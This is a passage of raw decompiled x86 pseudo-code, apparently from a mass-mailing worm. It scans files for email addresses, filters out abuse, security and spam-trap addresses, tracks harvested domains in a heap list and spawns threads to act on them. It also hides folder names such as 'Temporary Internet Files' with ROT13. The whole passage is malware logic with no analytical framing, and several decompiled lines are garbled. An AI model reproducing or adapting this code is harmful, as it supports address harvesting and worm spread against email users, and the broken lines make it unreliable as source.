        004a5c5b: if(*__imp__lstrlenA(esi) < 3 || *esi == 64) {
            ff1002ab: goto L004a5c66;
        }
        004a5c62: eax = 0;
    } else {
004a5c66: L004a5c66:
        004a5c68: eax = 1;
    }
    004a5c69: (restore)edi;
    004a5c6a: (restore)esi;
    004a5c6b: (restore)ebp;
}

/*	Procedure: 0x004A5C6E - 0x004A5E02
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 16
 */

L004A5C6E(A14)
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  ebp;
	/* unknown */ void  esi;



    004a5c79: if(*A14 != 0) {
        004a5c81: *L004A8B04 = 0;
        004a5c87: *L004A8C08 = 0;
        004a5c8e: if(*A14 != 0) {
            004a5c94: ecx = A14;
            004a5c96: do {
                004a5c99: if(*ecx == 64) {
                    004a5c9b: *L004A8B04 = *L004A8B04 + 1;
                }
                004a5ca1: eax = eax + 1;
                004a5ca2: *L004A8C08 = eax;
                004a5ca7: *(eax + A14) :: 0;
            } while(ecx = eax + A14);
            004a5cb2: ebx = 1;
            004a5cb9: if(*L004A8B04 == 1) {
                004a5cbf: esi = __imp__lstrlenA;
                004a5cc5: (save)A14;
                004a5cc6: for(eax = *__imp__lstrlenA(); 1; eax = eax - 1) {
                    004a5cca: *L004A8C08 = eax;
                    004a5ccf: if(eax <= 0) {
                        ff1002b9: break;
                    }
                    004a5cd1: cl = *(A14 + eax - 1);
                    004a5cd8: if(cl == 46) {
                        ff1002bb: break;
                    }
                    004a5cdd: if(cl == 64) {
                        ff1002bd: goto L004a5dfc;
                    }
                }
                004a5ce8: if(eax == 0) {
                    ff1002bf: goto L004a5dfc;
                }
                004a5cee: (save)A14;
                004a5cef: eax = *esi();
                004a5cf9: eax = eax + ebx - *L004A8C08;
                004a5cfe: *L004A8C0C = eax;
                004a5d03: if(eax < 2 || eax > 4) {
                    ff1002c1: goto L004a5dfc;
                }
                004a5d12: ebp = 0x4a8c10;
                004a5d17: ebx = 0x4a8b08;
                004a5d1f: L004A5E03(A14, 0x4a8b08, 0x4a8c10);
                004a5d27: (save)0x4a8b08;
                004a5d28: eax = *esi();
                004a5d2d: *L004A8C08 = eax;
                004a5d32: if(eax >= 2 && eax <= 24) {
                    004a5d41: (save)ebp;
                    004a5d42: eax = *esi();
                    004a5d47: *L004A8C08 = eax;
                    004a5d4c: if(eax >= 6 && eax <= 42) {
                        004a5d5b: (save)ebp;
                        004a5d5c: eax = *esi();
004a5d5e: L004a5d5e:
                        004a5d5e: do {
                            004a5d5e: eax = eax - 1;
                            004a5d61: *L004A8C08 = eax;
                            004a5d66: if(eax <= 0) {
                                ff1002cd: goto L004a5d7c;
                            }
                            004a5d6f: if(*(eax + 0x4a8c10) != 46) {
                                ff1002cf: goto L004a5d5e;
                            }
                        } while(*(eax + 0x4a8c0f) != 46);
                        004a5d7a: goto L004a5df3;
004a5d7c: L004a5d7c:
                        004a5d7c: cl = *L004A8B08;
                        004a5d82: eax = 0;
                        004a5d84: *L004A8B04 = 0;
                        004a5d8a: *L004A8C08 = 0;
                        004a5d91: if(cl != 0) {
                            004a5d93: do {
                                004a5d96: if(cl >= 48 && cl <= 57) {
                                    004a5d9d: *L004A8B04 = *L004A8B04 + 1;
                                }
                                004a5da3: cl = *(eax + 0x4a8b09);
                                004a5da9: eax = eax + 1;
                            } while(cl != 0);
                            004a5dae: *L004A8C08 = eax;
                        }
                        004a5db3: (save)ebx;
                        004a5db6: ecx = *esi();
                        004a5db8: eax = *L004A8B04;
                        004a5dbd: 100 = eax * eax;
                        004a5dc0: asm("cdq");
                        004a5dc1: edx = ecx / ecx % ecx / ecx;
                        004a5dc3: (save)ebx;
                        004a5dc4: *L004A8C08 = eax;
                        004a5dce: if(*esi() > 12) {
                            004a5dd0: *L004A8C08 :: 50;
                        } else {
                            004a5ddf: if(*esi(ebx) >= 6) {
                                004a5de1: *L004A8C08 :: 60;
                            }
                        }
                        004a5df1: if(*L004A8C08 < 70) {
                            ff1002df: goto L004a5df8;
                        }
                    }
                }
            }
        }
    }
004a5df3: L004a5df3:
    004a5df5: eax = 1;
    004a5df6: goto L004a5dfe;
004a5df8: L004a5df8:
    004a5df8: eax = 0;
    004a5dfa: goto L004a5dfe;
004a5dfc: L004a5dfc:
    004a5dfc: eax = ebx;
004a5dfe: L004a5dfe:
}

/*	Procedure: 0x004A5E03 - 0x004A5ECB
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 4
 */

L004A5E03(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;



    004a5e07: ebx = Ac;
    004a5e0a: (save)esi;
    004a5e0b: esi = A8;
    004a5e0e: (save)edi;
    004a5e0f: edi = 0;
    004a5e14: if(*esi != 64) {
        004a5e16: do {
            004a5e16: al = *(edi + esi);
            004a5e1b: if(al == 0) {
                ff1002e3: break;
            }
            004a5e1f: if(ebx != 0) {
                004a5e2a: if(*__imp____mb_cur_max <= 1) {
                    004a5e42: eax = al;
                    004a5e4a: eax = *( *__imp___pctype + eax * 2) & 8;
                } else {
                    004a5e32: eax = *__imp___isctype(al, 8);
                }
                004a5e4f: if(eax == 0) {
                    004a5e54: *ebx = *(edi + esi);
                    004a5e56: ebx = ebx + 1;
                }
            }
            004a5e57: edi = edi + 1;
        } while(*(edi + esi) != 64);
    }
    004a5e60: if(ebx != 0) {
        004a5e62: *ebx = 0;
    }
    004a5e69: if(*(edi + esi) != 0) {
        004a5e6b: ebx = A10;
        004a5e70: if(ebx != 0) {
            004a5e72: for(esi = edi + esi + 1; *esi != 0; esi = esi + 1) {
                004a5e83: if(*__imp____mb_cur_max <= 1) {
                    004a5e9b: eax = *esi;
                    004a5ea3: eax = *( *__imp___pctype + eax * 2) & 8;
                } else {
                    004a5e8b: eax = *__imp___isctype( *esi, 8);
                }
                004a5ea8: if(eax == 0) {
                    004a5eac: *ebx = *esi;
                    004a5eae: ebx = ebx + 1;
                }
            }
            004a5eb2: *ebx = 0;
        }
    } else {
        004a5ebb: if(A10 != 0) {
            004a5ec1: eax = *__imp__lstrcpyA(A10, esi);
        }
    }
    004a5ec7: (restore)edi;
    004a5ec8: (restore)esi;
}

/*	Procedure: 0x004A5ECC - 0x004A5F8B
 *	Argument size: 4
 *	Local size: 256
 *	Save regs size: 8
 */

L004A5ECC(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vffffff00;



    004a5ed7: esi = A8;
    004a5eda: ebx = 0;
    004a5edc: for(al = *esi; al != bl && al != 64; esi = esi + 1) {
        004a5ee6: al = *(esi + 1);
    }
    004a5eef: if(*esi == 64) {
        004a5ef5: (save)edi;
        004a5ef6: edi = 0;
        004a5ef8: esi = esi + 1;
        004a5ef9: do {
            004a5ef9: al = *esi;
            004a5efd: if(al == bl) {
                ff100301: break;
            }
            004a5f03: *__imp__tolower(al);
            004a5f09: *(ebp + edi + -256) = al;
            004a5f10: edi = edi + 1;
            004a5f11: esi = esi + 1;
        } while(edi < 255);
        004a5f21: *(ebp + edi + -256) = bl;
        004a5f28: (restore)edi;
        004a5f29: if(*L004A11E8 != ebx) {
            004a5f2b: eax = 0x4a11e8;
            004a5f30: esi = 0x4a11e8;
            004a5f32: do {
                004a5f32: (save) *eax;
                004a5f43: (restore)ecx;
                004a5f44: if(L004A48E9( & Vffffff00) != 0) {
                    ff100307: goto L004a5f7d;
                }
                004a5f46: esi = esi + 4;
                004a5f49: eax = esi;
            } while(*esi != ebx);
        }
        004a5f55: if(*L004A119C == ebx) {
            ff10030b: goto L004a5f86;
        }
        004a5f57: eax = 0x4a119c;
        004a5f5c: esi = 0x4a119c;
        004a5f5e: do {
            004a5f5e: (save) *eax;
            004a5f6f: (restore)ecx;
            004a5f70: if(L004A48E9( & Vffffff00) != 0) {
                ff10030d: goto L004a5f81;
            }
            004a5f72: esi = esi + 4;
            004a5f75: eax = esi;
        } while(*esi != ebx);
        004a5f7b: goto L004a5f86;
004a5f7d: L004a5f7d:
        004a5f7d: (save)100;
        004a5f7f: goto L004a5f83;
004a5f81: L004a5f81:
        004a5f81: (save)1;
004a5f83: L004a5f83:
        004a5f83: (restore)eax;
    } else {
004a5f86: L004a5f86:
        004a5f86: eax = 0;
    }
}

/*	Procedure: 0x004A5F8C - 0x004A60D0
 *	Argument size: 4
 *	Local size: 272
 *	Save regs size: 12
 */

L004A5F8C(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffef0;
	/* unknown */ void  Vfffffff0;



    004a5f98: edi = A8;
    004a5f9b: ebx = 0;
    004a5f9d: esi = 0;
    004a5f9f: do {
        004a5f9f: al = *edi;
        004a5fa3: if(al == bl || al == 64) {
            ff100311: break;
        }
        004a5fad: *__imp__tolower(al);
        004a5fb3: *(ebp + esi + -272) = al;
        004a5fba: esi = esi + 1;
        004a5fbb: edi = edi + 1;
    } while(esi < 255);
    004a5fc8: *(ebp + esi + -272) = bl;
    004a5fcf: if(*edi == 64) {
        004a5fdb: if(*L004A125C != ebx) {
            004a5fdd: eax = 0x4a125c;
            004a5fe2: esi = 0x4a125c;
            004a5fe4: do {
                004a5fe4: (save) *eax;
                004a5fec: (save) & Vfffffef0;
                004a5ff5: if(*__imp__lstrcmpA() == 0) {
                    ff10031b: goto L004a60cc;
                }
                004a5ffb: esi = esi + 4;
                004a5ffe: eax = esi;
            } while(*esi != ebx);
        }
        004a601c: if(L004A498D( & Vfffffef0, "spm", 3) == 0) {
            ff10031f: goto L004a60cc;
        }
        004a602b: L004A471C( & Vfffffff0, "fcnz");
        004a6045: if(L004A48E9( & Vfffffef0, & Vfffffff0) != 0 || L004A498D( & Vfffffef0, "www", 3) == 0 || L004A498D( & Vfffffef0, "secur", 5) == 0 || L004A498D( & Vfffffef0, "abuse", 5) == 0) {
            ff100321: goto L004a60cc;
        }
        004a609f: if(*L004A12D8 != ebx) {
            004a60a1: eax = 0x4a12d8;
            004a60a6: esi = 0x4a12d8;
            004a60a8: do {
                004a60a8: (save) *eax;
                004a60b9: (restore)ecx;
                004a60ba: if(L004A48E9( & Vfffffef0) != 0) {
                    ff10032b: goto L004a60cc;
                }
                004a60bc: esi = esi + 4;
                004a60bf: eax = esi;
            } while(*esi != ebx);
        }
    }
    004a60c5: eax = 0;
004a60c7: L004a60c7:
    004a60cb: return;
004a60cc: L004a60cc:
    004a60ce: eax = 1;
    004a60cf: goto L004a60c7;
}

/*	Procedure: 0x004A60D1 - 0x004A619A
 *	Argument size: 0
 *	Local size: 384
 *	Save regs size: 4
 */

L004A60D1()
{
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffe80;
	/* unknown */ void  Vffffff80;



    004a60db: eax = *L004A8D14;
    004a60e0: esi = 0;
    004a60e4: if(eax != 0) {
        004a60ea: do {
            004a60ea: eax = *eax;
            004a60ec: esi = esi + 1;
        } while(eax != 0);
        004a60f3: if(esi != 0) {
            004a60f9: L004A48D1();
            004a60fe: edx = 0;
            004a6100: ecx = 0;
            004a6102: edx = esi / esi % esi / esi;
            004a6104: eax = *L004A8D14;
            004a610b: if(edx > 0) {
                004a610d: do {
                    004a610f: if(eax == 0) {
                        ff100337: goto L004a6198;
                    }
                    004a6115: eax = *eax;
                    004a6117: ecx = ecx + 1;
                } while(ecx < edx);
            }
            004a611e: if(eax != 0) {
                004a6120: for(eax = eax + 10; 1; eax = eax + 1) {
                    004a6123: cl = *eax;
                    004a6127: if(cl == 0 || cl == 64) {
                        ff10033d: break;
                    }
                }
                004a6134: if(*eax == 64) {
                    004a6137: (save)79;
                    004a6139: (save)eax + 1;
                    004a613d: (save) & Vffffff80;
                    004a613e: *__imp__lstrcpynA();
                    004a6144: L004A48BC();
                    004a6149: eax = ax & 65535;
                    004a614c: (save)49;
                    004a614e: edx = 0;
                    004a6150: (restore)ecx;
                    004a6151: edx = ecx / ecx % ecx / ecx;
                    004a6159: (save) *(edx * 4 + 0x4a1308);
                    004a6160: (save) & Vfffffe80;
                    004a6161: *__imp__lstrcpyA();
                    004a6167: esi = __imp__lstrcatA;
                    004a6173: (save)"@";
                    004a6178: (save) & Vfffffe80;
                    004a6179: *__imp__lstrcatA();
                    004a617e: (save) & Vffffff80;
                    004a6185: (save) & Vfffffe80;
                    004a6186: *esi();
                    004a6191: eax = L004A57C7( & Vfffffe80, 1);
                }
            }
        }
    }
004a6198: L004a6198:
}

stack space not deallocated on return
/*	Procedure: 0x004A619B - 0x004A61C3
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 4
 */

L004A619B(Ac)
/* unknown */ void  Ac;
{
	/* unknown */ void  esi;



    004a619c: for(esi = *L004A8D18; 1; esi = *esi) {
        004a61a4: if(esi == 0) {
            ff100343: goto L004a61c0;
        }
        004a61b6: if(*__imp__lstrcmpiA(esi + 8, Ac) == 0) {
            ff100345: break;
        }
    }
    004a61bf: return(esi);
004a61c0: L004a61c0:
    004a61c3: return(0);
}

stack space not deallocated on return
/*	Procedure: 0x004A61C4 - 0x004A6299
 *	Argument size: 16
 *	Local size: 0
 *	Save regs size: 8
 */

L004A61C4(A18, A1c, A24)
/* unknown */ void  A18;
/* unknown */ void  A1c;
/* unknown */ void  A24;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;



    004a61c6: ebx = 0;
    004a61c8: esi = 0;
    004a61ca: eax = *L004A8D18;
    004a61cf: ecx = 0;
    004a61d3: if(eax != 0) {
        004a61d5: do {
            004a61d8: if(*(eax + 92) == ebx) {
                004a61dc: if(esi == ebx) {
                    ff10034b: goto L004a61e6;
                }
                004a61e4: if(*(esi + 88) < *(eax + 88)) {
004a61e6: L004a61e6:
                    004a61e6: esi = eax;
                }
            }
            004a61e8: eax = *eax;
            004a61ea: ecx = ecx + 1;
        } while(eax != ebx);
        004a61f5: if(ecx > 256) {
            ff100351: goto L004a6255;
        }
    }
    004a61f7: (save)96;
    004a61f9: (save)ebx;
    004a6200: (save) *__imp__GetProcessHeap();
    004a6207: esi = *__imp__HeapAlloc();
    004a620b: if(esi == ebx) {
004a620d: L004a620d:
        004a620f: eax = 1;
    } else {
        004a6219: memset(esi, ebx, 96);
        004a6225: *(esi + 4) = A24;
        004a622b: (save)79;
        004a622d: (save)A18;
        004a6231: (save)esi + 8;
        004a6232: *__imp__lstrcpynA();
        004a623e: *(esi + 88) = *__imp__GetTickCount();
        004a6241: *(esi + 92) = ebx;
        004a6249: *esi = *L004A8D18;
        004a624b: *L004A8D18 = esi;
        004a6251: eax = 0;
        004a6253: goto L004a6297;
004a6255: L004a6255:
        004a6257: if(esi == ebx || *(esi + 92) != ebx) {
            ff100355: goto L004a620d;
        }
        004a625f: edi = esi + 8;
        004a6262: *(esi + 92) = 1;
        004a6269: *edi = bl;
        004a6274: *(esi + 88) = *__imp__GetTickCount();
        004a6277: L004A57A4( *(esi + 4));
        004a6284: *__imp__lstrcpynA(edi, A1c, 79, edi);
        004a628e: *(esi + 92) = ebx;
        004a6291: *(esi + 4) = A1c;
        004a6294: eax = 0;
        004a6296: (restore)edi;
    }
004a6297: L004a6297:
}

/*	Procedure: 0x004A629A - 0x004A62DF
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 4
 */

L004A629A(A8)
/* unknown */ void  A8;
{



    004a629f: (save)edi;
    004a62a1: eax = L004A619B(A8);
    004a62a9: if(eax == 0) {
        004a62b1: edi = L004A55B5(A8);
        004a62b6: if(edi == 0) {
            004a62b8: *__imp__GetTickCount();
            004a62c0: if(al & 3) {
                ff10035d: goto L004a62d6;
            }
        }
        004a62c2: (save)edi;
        004a62c3: (save)A8;
        004a62c4: L004A61C4();
        004a62ca: eax = L004A619B(A8);
        004a62d4: if(eax != 0) {
            ff10035f: goto L004a62da;
        }
004a62d6: L004a62d6:
        004a62d6: eax = 0;
    } else {
004a62da: L004a62da:
        004a62da: *(eax + 92) = *(eax + 92) + 1;
    }
    004a62dd: (restore)edi;
}

/*	Procedure: 0x004A62E0 - 0x004A634E
 *	Argument size: -76
 *	Local size: 80
 *	Save regs size: 0
 */

L004A62E0(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vffffffb0;



    004a62e9: (save)esi;
    004a62ea: (save)edi;
    004a62eb: edi = A8 + 10;
    004a62ee: for(eax = edi; 1; eax = eax + 1) {
        004a62f0: cl = *eax;
        004a62f4: if(cl == 0 || cl == 64) {
            ff100361: break;
        }
    }
    004a6301: if(*eax == 64) {
        004a6304: (save)79;
        004a6306: (save)eax + 1;
        004a630a: (save) & Vffffffb0;
        004a630b: *__imp__lstrcpynA();
        004a6315: eax = L004A629A( & Vffffffb0);
        004a631a: esi = eax;
        004a631f: if(esi != 0) {
            004a6327: edi = L004A759E(edi);
            004a632c: if(edi != 0) {
                004a6332: L004A80E5( *(esi + 4), edi);
                004a633a: *__imp__GlobalFree(edi);
            }
            004a6340: eax = *(esi + 92);
            004a6345: if(eax > 0) {
                004a6347: eax = eax - 1;
                004a6348: *(esi + 92) = eax;
            }
        }
    }
    004a634b: (restore)edi;
    004a634c: (restore)esi;
}

/*	Procedure: 0x004A634F - 0x004A63A8
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 8
 */

L004A634F()
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    004a6351: edi = 0x4a8d14;
    004a6356: for(esi = *L004A8D14; esi != 0; esi = *esi) {
        004a6364: if(*(esi + 8) == 2) {
            004a636c: eax = *__imp__GetTickCount() - *(esi + 4);
            004a636f: edx = 0;
            004a6376: edx = 1000 / 1000 % 1000 / 1000;
            004a637d: if(eax + 5 < 0 || eax > 7200) {
                004a638c: ecx = *esi;
                004a6391: *edi = ecx;
                004a6393: esi = *esi;
                004a639e: eax = *__imp__HeapFree( *__imp__GetProcessHeap(), 0, esi);
                004a63a4: continue;
            }
        }
        004a6386: edi = esi;
    }
}

/*	Procedure: 0x004A63A9 - 0x004A6529
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L004A63A9(A0)
/* unknown */ void  A0;
{
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    004a63a9: esp = esp - 12;
    004a63ac: *esp = 0;
    004a63b1: (save)ebx;
    004a63b2: (save)ebp;
    004a63b3: (save)A0;
    004a63b4: (save)edi;
    004a63b5: *L004A8D1C = 0;
    004a63bf: for(edi = __imp__Sleep; 1; *edi()) {
        004a63cc: if(L004A4CEE() != 0) {
            004a63f3: L004A6E30(0 & 255);
            004a63f8: A0 = 0;
            004a63fb: ebx = 0;
            004a63fd: ebp = 0;
            004a63ff: Vfffffff8 = 0;
            004a6403: eax = *L004A8D14;
            004a640a: if(eax != 0) {
                004a640c: do {
                    004a640c: ebx = ebx + 1;
                    004a6411: if(*(eax + 8) == 0) {
                        004a6413: ebp = ebp + 1;
                        004a6416: if(A0 == 0) {
                            ff10037b: goto L004a6420;
                        }
                        004a641e: if(*(A0 + 9) > *(eax + 9)) {
004a6420: L004a6420:
                            004a6420: A0 = eax;
                        }
                    }
                    004a6422: ecx = *(eax + 4);
                    004a6429: if(ecx >= Vfffffff8) {
                        004a642b: Vfffffff8 = ecx;
                    }
                    004a642f: eax = *eax;
                } while(eax != 0);
                004a643b: if(ebx >= 4096) {
                    004a643d: L004A634F();
                    004a6448: if(ebp > 512) {
                        ff100386: goto L004a644e;
                    }
                }
            }
            004a645a: Vfffffff4 = 0;
            004a645e: goto L004a645f;
004a644e: L004a644e:
            004a644e: Vfffffff4 = 1;
            004a6452: L004A6E30(1);
004a645f: L004a645f:
            004a645f: eax = 0;
            004a6463: if(ebp != 0 && A0 != 0) {
                ff10038a: goto L004a6469;
            }
            004a64af: Vfffffff4 = 2;
            004a64b7: L004A6E30(eax);
            004a64c0: if(ebx >= 3 && Vfffffff8 != 0 && *__imp__GetTickCount() - Vfffffff8 >= 6000) {
                004a64da: L004A60D1();
                004a64df: (save)128;
                004a64e3: goto L004a64e4;
004a6469: L004a6469:
                004a6470: if(*L004A8D1C >= 4) {
                    ff10038c: goto L004a6472;
                }
                004a647d: *(A0 + 8) = 1;
                004a6481: (save) & Vfffffffc;
                004a6482: (save)eax;
                004a6483: (save)A0;
                004a6484: (save)0x4a64eb;
                004a6489: (save)eax;
                004a648a: (save)eax;
                004a648b: eax = *__imp__CreateThread();
                004a6493: if(eax != 0 && eax != -1) {
                    ff100390: goto L004a649a;
                }
                004a64a3: *(A0 + 8) = 2;
            }
            004a64a7: (save)1024;
            004a64ac: goto L004a64e4;
004a649a: L004a649a:
            004a649a: (save)eax;
            004a649b: *__imp__CloseHandle();
004a6472: L004a6472:
            004a6472: (save)256;
        } else {
            004a63ce: (save)2048;
            004a63d3: *edi();
            004a63d5: (save)1;
            004a63d7: L004A6E30();
            004a63dc: *esp = 14336;
        }
004a64e4: L004a64e4:
    }
    004a64eb: (save)A0;
    004a64ec: (save)edi;
    004a64ed: edi = 0x4a8d1c;
    004a64f2: (save)0x4a8d1c;
    004a64f3: *__imp__InterlockedIncrement();
    004a64ff: if(A0 != 0) {
        004a6501: (save)A0;
        004a6502: *(A0 + 8) = 1;
        004a6506: L004A62E0();
        004a650c: *(A0 + 8) = 2;
    }
    004a6517: if(*L004A8D1C > 0) {
        004a6519: (save)edi;
        004a651a: *__imp__InterlockedDecrement();
    }
    004a6520: (save)0;
    004a6522: *__imp__ExitThread();
    004a6528: (restore)edi;
    004a6529: (restore)A0;
}

/*	Procedure: 0x004A652A - 0x004A653B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004A652A()
{



    004a652c: *L004A8D14 = 0;
    004a6531: *L004A8D1C = 0;
    004a6536: *L004A8D18 = 0;
    004a653b: return(0);
}

/*	Procedure: 0x004A653C - 0x004A6548
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004A653C()
{



    004a653c: L004A63A9();
    004a6541: (save)0;
    004a6543: *__imp__ExitThread();
}

/*	Procedure: 0x004A6549 - 0x004A6638
 *	Argument size: 8
 *	Local size: 260
 *	Save regs size: 4
 */

L004A6549(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffefc;
	/* unknown */ void  Vfffffffc;



    004a6553: edi = 0;
    004a6558: Vfffffffc = 0;
    004a655b: if(Ac > 0) {
        004a6561: (save)ebx;
        004a6562: (save)esi;
        004a6563: esi = A8;
        004a6566: do {
            004a6566: *(esi + edi) :: 64;
            004a656d: A8 = ebx;
            004a6570: if(!(ebx = edi + 1)) {
                004a6578: ecx = edi;
                004a657a: if(edi > 0) {
                    004a657c: do {
                        004a6588: if(*(( *(esi + ecx - 1) & 255) + 0x4a3270) == 0) {
                            ff1003a1: break;
                        }
                        004a658a: ecx = ecx - 1;
                    } while(ecx > 0);
                }
                004a6592: eax = ebx;
                004a6594: if(ebx < Ac) {
                    004a6596: do {
                        004a65a1: if(*(( *(eax + esi) & 255) + 0x4a3270) == 0) {
                            ff1003a7: break;
                        }
                        004a65a3: eax = eax + 1;
                    } while(eax < Ac);
                }
                004a65a9: while(ecx < eax && *(( *(ecx + esi) & 255) + 0x4a3270) == 2) {
                    004a65ba: ecx = ecx + 1;
                }
                004a65bd: edx = ecx + 3;
                004a65c2: if(edx < eax && ecx < edi) {
                    004a65ca: if(eax > ecx) {
                        004a65cc: do {
                            004a65d8: if(*(( *(esi + eax - 1) & 255) + 0x4a3270) != 2) {
                                ff1003b5: break;
                            }
                            004a65da: eax = eax - 1;
                        } while(eax > ecx);
                        004a65df: ebx = A8;
                    }
                    004a65e4: if(eax > edx && eax > edi) {
                        004a65ec: edi = eax - ecx;
                        004a65f1: if(edi >= 7) {
                            004a65f3: Vfffffffc = Vfffffffc + 1;
                            004a65f6: edx = 0;
                            004a65f8: ecx = ecx + esi;
                            004a65fa: do {
                                004a65fc: if(edx >= edi) {
                                    ff1003bf: break;
                                }
                                004a6600: *(ebp + edx + -260) = *ecx;
                                004a6607: edx = edx + 1;
                                004a6608: ecx = ecx + 1;
                            } while(edx < 254);
                            004a6611: *(ebp + edx + -260) = 0;
                            004a6620: L004A6639( & Vfffffefc);
                        }
                    }
                }
            }
            004a6626: edi = ebx;
        } while(edi < Ac);
        004a6631: (restore)esi;
        004a6632: (restore)ebx;
    }
    004a6638: return(Vfffffffc);
}

/*	Procedure: 0x004A6639 - 0x004A6646
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L004A6639(A4)
/* unknown */ void  A4;
{



    004a6646: return(L004A57C7(A4, 0));
}

/*	Procedure: 0x004A6647 - 0x004A6718
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L004A6647(A8)
/* unknown */ void  A8;
{



    004a664a: eax = 65548;
    004a664f: L004A8AD0();
    004a6654: (save)ebx;
    004a6655: ebx = 0;
    004a6657: (save)0;
    004a6658: (save)128;
    004a665d: (save)3;
    004a665f: (save)0;
    004a6660: (save)3;
    004a6662: (save)-2147483648;
    004a6667: (save)A8;
    004a666a: eax = *__imp__CreateFileA();
    004a6672: *(ebp - 12) = eax;
    004a6675: if(eax != ebx) {
        004a667e: if(eax == -1) {
            ff1003c7: goto L004a6713;
        }
        004a6684: (save)esi;
        004a6685: esi = __imp__ReadFile;
        004a668b: (save)edi;
        004a668f: (save)ebx;
        004a6690: (save) & A8;
        004a6691: edi = 65533;
        004a669c: (save)65533;
        004a669d: (save)ebp + -65548;
        004a669e: *(ebp - 4) = ebx;
        004a66a1: *(ebp - 8) = ebx;
        004a66a4: A8 = ebx;
        004a66a7: for((save)eax; 1; A8 = ebx) {
            004a66a8: *esi();
            004a66aa: eax = A8;
            004a66af: if(eax == ebx || eax >= 65535) {
                ff1003c9: break;
            }
            004a66b8: *(ebp - 4) = *(ebp - 4) + eax;
            004a66bb: *(ebp + eax + -65548) = bl;
            004a66c2: (save)eax;
            004a66c9: (save)ebp + -65548;
            004a66ca: L004A6719();
            004a66e4: if(!( *(ebp - 8) = *(ebp - 8) + L004A6549(ebp + -65548, A8)) && *(ebp - 4) > 307200) {
                ff1003cf: break;
            }
            004a66f2: (save)ebx;
            004a66f3: (save) & A8;
            004a66fa: (save)edi;
            004a66fb: (save)ebp + -65548;
            004a66fc: (save) *(ebp - 12);
        }
        004a6707: *__imp__CloseHandle( *(ebp - 12));
        004a670d: (restore)edi;
        004a670e: eax = 0;
        004a6710: (restore)esi;
    } else {
004a6713: L004a6713:
        004a6715: eax = 1;
    }
    004a6716: (restore)ebx;
}

/*	Procedure: 0x004A6719 - 0x004A680A
 *	Argument size: -4
 *	Local size: 12
 *	Save regs size: 0
 */

L004A6719(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    004a671f: eax = A8;
    004a6722: (save)ebx;
    004a6723: (save)esi;
    004a6724: (save)edi;
    004a6725: edi = Ac;
    004a672a: if(edi > 0) {
        004a672c: edx = edi;
        004a672e: do {
            004a6731: cl = *(( *eax & 255) + " ");
            004a6739: if(cl != 0) {
                004a673b: *eax = cl;
            }
            004a673d: eax = eax + 1;
        } while(edx = edx - 1);
    }
    004a6741: do {
        004a6741: esi = 0;
        004a6745: Vfffffffc = 0;
        004a6748: if(edi >= 0) {
            004a674e: do {
                004a674e: ebx = *L004A31E0;
                004a6756: Vfffffff8 = ebx;
                004a6759: if(ebx != 0) {
                    004a675b: edi = 0x4a31e8;
                    004a6760: do {
                        004a6762: if(ebx <= esi) {
                            004a6769: eax = esi - ebx;
                            004a676c: Vfffffff4 = eax;
                            004a677f: if(L004A493D( *(edi - 4), Vfffffff4 + A8, ebx) == 0) {
                                004a6783: esi = Vfffffff4;
                                004a6789: Vfffffffc = Vfffffffc + 1;
                                004a6792: memcpy(A8 + esi, *(edi + 4), *edi);
                                004a6797: eax = *edi;
                                004a679e: if(ebx != eax) {
                                    004a67a3: eax = eax + esi;
                                    004a67a8: eax = eax + A8;
                                    004a67ae: ecx = ebx + esi + A8;
                                    004a67b1: edx = Ac - Vfffffff8 - esi;
                                    004a67b5: if(edx > 0) {
                                        004a67b7: do {
                                            004a67b9: *eax = *ecx;
                                            004a67bb: eax = eax + 1;
                                            004a67bc: ecx = ecx + 1;
                                        } while(edx = edx - 1);
                                    }
                                    004a67c0: ebx = Vfffffff8;
                                }
                                004a67c7: Ac = Ac + *edi - ebx;
                            }
                        }
                        004a67ca: ebx = *(edi + 8);
                        004a67cd: edi = edi + 16;
                        004a67d2: Vfffffff8 = ebx;
                    } while(ebx != 0);
                    004a67d7: edi = Ac;
                }
                004a67da: esi = esi + 1;
            } while(esi <= edi);
        }
        004a67e3: esi = A8;
        004a67e7: *(esi + edi) = 0;
        004a67f0: Vfffffffc = Vfffffffc + L004A49C0(esi);
    } while(eax = L004A4B5A(esi) + Vfffffffc);
    004a6804: (restore)edi;
    004a6805: (restore)esi;
    004a6808: (restore)ebx;
    004a680a: return(0);
}

/*	Procedure: 0x004A680B - 0x004A68F8
 *	Argument size: 0
 *	Local size: 520
 *	Save regs size: 12
 */

L004A680B()
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffdf8;
	/* unknown */ void  Vffffff7c;
	/* unknown */ void  Vffffffbc;
	/* unknown */ void  Vfffffffc;



    004a6823: L004A471C( & Vffffff7c, "Grzcbenel Vagrearg Svyrf");
    004a6831: L004A471C( & Vffffffbc, "Ybpny Frggvatf");
    004a6836: edi = __imp__lstrcatA;
    004a683f: Vfffffffc = 0;
    004a6843: esi = 388;
